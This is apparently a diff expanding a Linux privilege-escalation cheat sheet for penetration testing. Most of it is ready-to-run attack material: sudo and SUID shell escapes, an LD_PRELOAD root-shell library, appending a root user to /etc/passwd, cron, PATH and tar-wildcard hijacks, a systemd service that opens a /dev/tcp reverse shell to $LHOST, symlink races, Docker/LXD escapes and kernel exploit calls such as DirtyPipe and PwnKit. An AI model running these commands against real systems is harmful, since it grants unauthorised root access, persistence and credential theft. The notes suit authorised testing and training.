@@ -1,41 +1,145 @@
 ---
 title: "Linux Privilege Escalation"
 ---
+
 ## Enumeration
 
-Run linpeas first for a broad sweep, then manually verify the interesting findings: automated tools flag a lot of noise.
+Run linpeas first for a broad sweep, then manually verify the interesting findings. Automated tools flag a lot of noise.
 
 ```bash wrap
 ./linpeas.sh | tee linpeas.out
 
+# Identity
 whoami; id; hostname; uname -a
+cat /etc/os-release
+
+# Users
 cat /etc/passwd | grep -v nologin
-cat /etc/crontab
+cat /etc/shadow 2>/dev/null
+cat /etc/group
+
+# Sudo rules
 sudo -l
+
+# SUID / SGID
 find / -perm -4000 -type f 2>/dev/null
-find / -writable -type f 2>/dev/null | grep -v proc
+find / -perm -2000 -type f 2>/dev/null
+
+# Capabilities
 getcap -r / 2>/dev/null
+
+# Cron jobs
+cat /etc/crontab
+ls -la /etc/cron*
+crontab -l
+cat /var/spool/cron/crontabs/* 2>/dev/null
+
+# Writable paths
+find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys
+find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys
+
+# Services and open ports
+ss -tlnp
+ps aux
+systemctl list-units --type=service
+
+# Credentials in config files
+find / -name "*.conf" -readable 2>/dev/null | xargs grep -l "password" 2>/dev/null
+find / -name "id_rsa" -readable 2>/dev/null
+```
+
+Use [pspy](https://github.com/DominicBreuker/pspy) to watch for processes spawned by root without needing root yourself.
+
+```bash wrap
+./pspy64
 ```
 
 ## Sudo Abuse
 
-`sudo -l` shows what commands you can run as root: check every result on GTFOBins for a known escape.
+`sudo -l` shows what commands you can run as root. Check every result on [GTFOBins](https://gtfobins.github.io).
 
 ```bash wrap
-sudo -l
-# GTFOBins: https://gtfobins.github.io
-sudo vim → :!bash
+sudo vim -c ':!/bin/bash'
+sudo nano         # CTRL+R CTRL+X, then: reset; sh 1>&0 2>&0
+sudo less /etc/passwd  # then: !/bin/bash
 sudo find . -exec /bin/bash \;
-sudo python -c 'import os; os.system("/bin/bash")'
+sudo python3 -c 'import os; os.execl("/bin/bash","bash")'
+sudo awk 'BEGIN {system("/bin/bash")}'
+sudo env /bin/bash
+sudo perl -e 'exec "/bin/bash"'
+sudo ruby -e 'exec "/bin/bash"'
+sudo lua -e 'os.execute("/bin/bash")'
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+sudo zip /tmp/x.zip /etc/passwd -T --unzip-command="sh -c /bin/bash"
 ```
+
+<AccordionGroup>
+  <Accordion title="LD_PRELOAD Abuse">
+    When `sudo -l` shows `env_keep+=LD_PRELOAD`, compile a shared library that spawns a root shell.
+
+    ```c wrap
+    // shell.c
+    #include <stdio.h>
+    #include <sys/types.h>
+    #include <stdlib.h>
+    void _init() {
+        unsetenv("LD_PRELOAD");
+        setgid(0);
+        setuid(0);
+        system("/bin/bash");
+    }
+    ```
+
+    ```bash wrap
+    gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles
+    sudo LD_PRELOAD=/tmp/shell.so $ALLOWED_BINARY
+    ```
+  </Accordion>
+  <Accordion title="LD_LIBRARY_PATH Abuse">
+    When `env_keep+=LD_LIBRARY_PATH` is preserved and the sudo-allowed binary loads a library from a path you can write to.
+
+    ```bash wrap
+    # Find libraries loaded by the binary
+    ldd $(which $BINARY)
+
+    # Shadow one of those libraries
+    gcc -fPIC -shared -o /tmp/libcrypt.so.1 shell.c -nostartfiles
+    sudo LD_LIBRARY_PATH=/tmp $BINARY
+    ```
+  </Accordion>
+</AccordionGroup>
 
 ## SUID Abuse
 
-SUID binaries run as their owner regardless of who executes them: anything non-standard owned by root is worth checking on GTFOBins.
+SUID binaries run as their owner regardless of who executes them. Anything non-standard owned by root is worth checking on GTFOBins.
 
 ```bash wrap
-find / -perm -4000 -type f 2>/dev/null
-# Check each on GTFOBins
+find / -perm -4000 -uid 0 -type f 2>/dev/null
+```
+
+```bash wrap
+# bash (with -p to preserve EUID)
+bash -p
+
+# find
+find . -exec /bin/bash -p \;
+
+# vim
+vim -c ':!/bin/bash -p'
+
+# cp: overwrite /etc/passwd
+cp /etc/passwd /tmp/passwd.bak
+echo 'hacker:$1$salt$qGtWTaEZJ.I2s2TkRCGVF0:0:0:root:/root:/bin/bash' >> /tmp/passwd.bak
+cp /tmp/passwd.bak /etc/passwd
+
+# nmap (older versions with --interactive)
+nmap --interactive
+!sh
+
+# perl / python / ruby
+perl -e 'exec "/bin/bash -p"'
+python3 -c 'import os; os.execl("/bin/bash","bash","-p")'
+ruby -e 'exec "/bin/bash -p"'
 ```
 
 ## Cron Jobs
@@ -45,23 +149,313 @@ Look for cron jobs running as root that call scripts you can write to: rewrite t
 ```bash wrap
 cat /etc/crontab
 ls -la /etc/cron*
-# Look for writable scripts called by root
+cat /var/spool/cron/crontabs/* 2>/dev/null
+./pspy64
+
+# Watch for spawned processes if pspy is unavailable
+watch -n 1 "ps aux | grep root"
 ```
 
-## Writable /etc/passwd
+<AccordionGroup>
+  <Accordion title="Writable Script">
+    The simplest case: find a root cron job calling a script you own.
 
-If `/etc/passwd` is world-writable, you can add a new root-level user with a known password hash.
+    ```bash wrap
+    # /etc/crontab shows:
+    # * * * * * root /opt/scripts/cleanup.sh
+    ls -la /opt/scripts/cleanup.sh   # owned by you
+    echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /opt/scripts/cleanup.sh
+    # Wait for cron execution
+    /tmp/bash -p
+    ```
+  </Accordion>
+  <Accordion title="PATH Hijacking via Cron">
+    If `/etc/crontab` has a PATH that includes a directory you can write to and the cron job calls a binary by short name.
 
-```bash wrap
-openssl passwd -1 -salt salt password
-echo 'hacker:$1$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
-```
+    ```bash wrap
+    # /etc/crontab
+    # PATH=/home/$USER:/usr/local/sbin:/usr/local/bin:/sbin:/bin
+    # * * * * * root cleanup
+    echo '/bin/bash -p' > /home/$USER/cleanup
+    chmod +x /home/$USER/cleanup
+    ```
+  </Accordion>
+  <Accordion title="Wildcard Injection">
+    When a cron job runs `tar *` or `rsync *` in a directory you can write to, create filenames that are parsed as flags.
+
+    ```bash wrap
+    # Cron: tar czf /backup.tar.gz /opt/backup/*
+    cd /opt/backup
+    echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" > shell.sh
+    chmod +x shell.sh
+    touch -- "--checkpoint=1"
+    touch -- "--checkpoint-action=exec=sh shell.sh"
+    # Next cron run triggers it
+    /tmp/bash -p
+    ```
+
+    ```bash wrap
+    # rsync wildcard: rsync -a /var/data/* /backup/
+    touch -- "-e sh shell.sh"
+    ```
+  </Accordion>
+</AccordionGroup>
 
 ## Capabilities
 
-Capabilities grant specific root-level privileges to binaries without full SUID: `cap_setuid+ep` on an interpreter is effectively root.
+Capabilities grant specific root-level privileges to binaries without full SUID. `cap_setuid+ep` on any interpreter is effectively root.
 
 ```bash wrap
 getcap -r / 2>/dev/null
-# python3 cap_setuid+ep → python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
+
+<AccordionGroup>
+  <Accordion title="Common Capabilities and Exploits">
+    | Capability | Effect |
+    |---|---|
+    | `cap_setuid+ep` | Call `setuid(0)` then exec a shell |
+    | `cap_setgid+ep` | Call `setgid(0)` for group escalation |
+    | `cap_dac_read_search` | Read any file, bypassing DAC |
+    | `cap_net_raw+ep` | Sniff traffic, craft raw packets |
+    | `cap_sys_admin` | Mount, ptrace, and much more |
+    | `cap_sys_ptrace` | Inject shellcode into root processes |
+
+    ```bash wrap
+    # python3 cap_setuid+ep
+    python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+    # perl cap_setuid+ep
+    perl -e 'POSIX::setuid(0); exec "/bin/bash"'
+
+    # node cap_setuid+ep
+    node -e 'process.setuid(0); require("child_process").spawn("/bin/bash",{stdio:[0,1,2]})'
+
+    # cap_dac_read_search via tar (reads /etc/shadow)
+    tar -cf - /etc/shadow 2>/dev/null | tar -xf -
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## PATH Hijacking
+
+When a SUID binary or root script calls a program by short name without an absolute path, prepend a writable directory to `PATH`.
+
+```bash wrap
+# Find what a binary calls (strings shows hardcoded names)
+strings /usr/local/bin/suid-binary | grep -v "/"
+ltrace /usr/local/bin/suid-binary 2>&1 | grep exec
+
+# Plant the malicious binary
+mkdir /tmp/hijack
+echo '/bin/bash -p' > /tmp/hijack/curl
+chmod +x /tmp/hijack/curl
+PATH=/tmp/hijack:$PATH /usr/local/bin/suid-binary
+```
+
+With sudo and `env_keep+=PATH`:
+
+```bash wrap
+sudo PATH=/tmp/hijack:$PATH $ALLOWED_BINARY
+```
+
+## Shared Library Hijacking
+
+When a SUID binary or root service loads a library from a path you can write to (check RPATH first, then `ld.so.conf`).
+
+```bash wrap
+# Find library load order
+ldd /usr/local/bin/suid-binary
+readelf -d /usr/local/bin/suid-binary | grep RPATH
+
+# Check if any load path is writable
+ls -la /opt/app/lib/
+```
+
+```c wrap
+// /opt/app/lib/libtarget.c
+#include <stdlib.h>
+static void inject() __attribute__((constructor));
+void inject() {
+    system("cp /bin/bash /tmp/bash; chmod +s /tmp/bash");
+}
+```
+
+```bash wrap
+gcc -shared -fPIC -o /opt/app/lib/libtarget.so /opt/app/lib/libtarget.c
+/usr/local/bin/suid-binary
+/tmp/bash -p
+```
+
+## Systemd / Service File Abuse
+
+If you can write to a `.service` file or its `ExecStart` script is writable, you control what runs as root on service restart.
+
+```bash wrap
+# Find writable service files
+find /etc/systemd /lib/systemd /usr/lib/systemd -writable 2>/dev/null
+
+# Check ExecStart of a running service
+systemctl cat $SERVICE | grep Exec
+ls -la /opt/scripts/start.sh
+```
+
+```bash wrap
+# Modify the ExecStart script
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /opt/scripts/start.sh
+
+systemctl daemon-reload
+systemctl restart $SERVICE
+/tmp/bash -p
+```
+
+If you can write to `/etc/systemd/system/`:
+
+```bash wrap
+cat > /etc/systemd/system/shell.service << 'EOF'
+[Unit]
+Description=shell
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'
+[Install]
+WantedBy=multi-user.target
+EOF
+systemctl enable --now shell.service
+```
+
+## Race Conditions (TOCTOU)
+
+Time-of-Check to Time-of-Use: a privileged process checks permissions on a file, then uses it. Swap the file between check and use.
+
+```bash wrap
+# Classic symlink race: binary does access("/tmp/target") then open("/tmp/target")
+# Loop: keep swapping the symlink target while the vulnerable binary runs in parallel
+
+while true; do
+    ln -sf /tmp/legit /tmp/target 2>/dev/null
+    ln -sf /etc/passwd /tmp/target 2>/dev/null
+done &
+
+while true; do
+    /usr/local/bin/vulnerable-suid
+done
+```
+
+<AccordionGroup>
+  <Accordion title="Predictable Temp File">
+    When a root process creates a predictable temp file, pre-create a symlink at that path before it does.
+
+    ```bash wrap
+    # Target creates /tmp/privesc-<PID> — race the PID
+    ln -s /etc/cron.d/rootjob /tmp/privesc-1234
+
+    # Or watch for mktemp-style patterns
+    ln -s /etc/sudoers /tmp/tmpXXXXXX
+    ```
+  </Accordion>
+  <Accordion title="inotifywait-Assisted Race">
+    Trigger your symlink swap exactly when the access check fires.
+
+    ```bash wrap
+    inotifywait -m -e access /tmp/target 2>/dev/null |
+    while read path action file; do
+        ln -sf /etc/shadow /tmp/target
+    done &
+    /usr/local/bin/vulnerable-suid
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## NFS no_root_squash
+
+When an NFS share is exported with `no_root_squash`, your attacker machine root maps to root on the share. Create a SUID binary there.
+
+```bash wrap
+# Check exports on target
+cat /etc/exports
+showmount -e $TARGET
+
+# On attacker machine (as root)
+mount -t nfs $TARGET:/share /mnt/nfs
+cp /bin/bash /mnt/nfs/bash
+chmod +s /mnt/nfs/bash
+
+# On target
+/mnt/share/bash -p
+```
+
+## Docker / LXD
+
+<AccordionGroup>
+  <Accordion title="Docker Group">
+    Being in the `docker` group is effectively root: mount the host filesystem into a privileged container.
+
+    ```bash wrap
+    id | grep docker
+    docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+    docker run -v /:/host --rm -it ubuntu chroot /host
+    ```
+  </Accordion>
+  <Accordion title="LXD Group">
+    ```bash wrap
+    id | grep lxd
+
+    # Build a minimal Alpine image on attacker machine
+    git clone https://github.com/saghul/lxd-alpine-builder
+    cd lxd-alpine-builder && ./build-alpine
+    # Transfer alpine.tar.gz to target, then:
+
+    lxc image import alpine.tar.gz --alias myimage
+    lxc init myimage privesc -c security.privileged=true
+    lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+    lxc start privesc
+    lxc exec privesc /bin/sh
+    chroot /mnt/root
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## Writable /etc/passwd
+
+If `/etc/passwd` is world-writable, add a new root-level user with a known password hash.
+
+```bash wrap
+openssl passwd -1 -salt salt password
+echo 'hacker:$1$salt$qGtWTaEZJ.I2s2TkRCGVF0:0:0:root:/root:/bin/bash' >> /etc/passwd
+su hacker
+```
+
+## Kernel Exploits
+
+Last resort: kernel exploits are noisy, can crash the system, and are hard to control. Identify the kernel version and match to known CVEs.
+
+```bash wrap
+uname -a
+cat /etc/os-release
+searchsploit "linux kernel $(uname -r)"
+```
+
+<AccordionGroup>
+  <Accordion title="Notable CVEs">
+    | CVE | Name | Affected Versions |
+    |---|---|---|
+    | CVE-2022-0847 | DirtyPipe | Kernel 5.8 to 5.16.11 |
+    | CVE-2021-4034 | PwnKit | polkit pkexec, most distros pre-2022 |
+    | CVE-2021-3156 | Baron Samedit | sudo < 1.9.5p2 |
+    | CVE-2016-5195 | DirtyCow | Kernel 2.6.22 to 4.8.3 |
+    | CVE-2019-13272 | PTRACE_TRACEME | Kernel < 5.1.17 |
+
+    ```bash wrap
+    # DirtyPipe: overwrite read-only file content (e.g. /etc/passwd)
+    ./dirtypipe /etc/passwd 1 'root::0:0:root:/root:/bin/bash'
+    su
+
+    # PwnKit (pkexec SUID exploit)
+    gcc -o pwnkit exploit.c && ./pwnkit
+
+    # Baron Samedit (sudo heap overflow)
+    python3 exploit.py
+    ```
+  </Accordion>
+</AccordionGroup>
